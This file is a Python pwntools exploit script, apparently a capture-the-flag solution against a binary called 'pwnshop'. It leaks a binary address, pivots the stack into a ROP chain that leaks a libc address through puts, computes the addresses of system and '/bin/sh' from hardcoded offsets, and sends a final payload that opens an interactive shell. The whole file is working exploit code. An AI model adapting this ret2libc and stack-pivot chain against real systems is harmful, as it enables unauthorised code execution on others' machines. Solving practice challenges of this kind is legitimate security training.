#!/usr/bin/env python3

from pwn import process, u64, log, p64


def main():
    io = process('./pwnshop')

    #
    # STEP 1: Leak binary address
    #
    io.sendlineafter('\n> ', '2'.encode('utf8'))
    io.sendlineafter('What do you wish to sell? ', ''.encode('utf8'))
    leak_padding = b'1' * 8
    io.sendafter('How much do you want for it? ', leak_padding)

    binary_offset = io.recvline().split(leak_padding)[1].split(b'?')[0]
    binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
    binary_offset = u64(binary_offset, endian='little')
    binary_offset -= 0x40c0
    log.success(f'Leaked Binary Offset: {str(hex(binary_offset))}')

    #
    # STEP 2: Leaking LibC address with stack pivot and calling main again
    #
    got_puts = p64(binary_offset + 0x4018)
    plt_puts = p64(binary_offset + 0x1030)
    pop_rdi = p64(binary_offset + 0x13c3)
    buy_func = p64(binary_offset + 0x132a)
    padding_to_chain = 40 * b'a'

    rop_chain = pop_rdi + got_puts + plt_puts + buy_func
    padding_to_pivot = (72 - len(padding_to_chain) - len(rop_chain)) * b'b'
    sub_rsp = p64(0x1219 + binary_offset)

    payload = padding_to_chain + rop_chain + padding_to_pivot + sub_rsp

    io.sendlineafter('\n> ', '1'.encode('utf8'))
    io.sendafter('Enter details: ', payload)

    leaked_puts_libc = io.recvline()[:6]
    leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
    leaked_puts_libc = u64(leaked_puts_libc, endian='little')
    log.success(f'Leaked puts@GLIBCL Offset: {str(hex(leaked_puts_libc))}')

    libc_puts = 0x75e10
    libc_system = 0x49860
    libc_sh = 0x198882

    libc_offset = leaked_puts_libc - libc_puts

    system = p64(libc_offset + libc_system)
    log.info(f'Calculated system Location: {str(hex(u64(system)))}')
    sh = p64(libc_offset + libc_sh)
    log.info(f'Calculated sh Location: {str(hex(u64(sh)))}')

    #
    # STEP 4: Exploit!
    #
    rop_chain = pop_rdi + sh + system
    padding_to_pivot = (72 - len(padding_to_chain) - len(rop_chain))

    payload = bytes(padding_to_chain) + bytes(rop_chain) + bytes(padding_to_pivot) + sub_rsp

    io.sendafter('Enter details: ', payload)

    io.interactive()


if __name__ == "__main__":
    main()
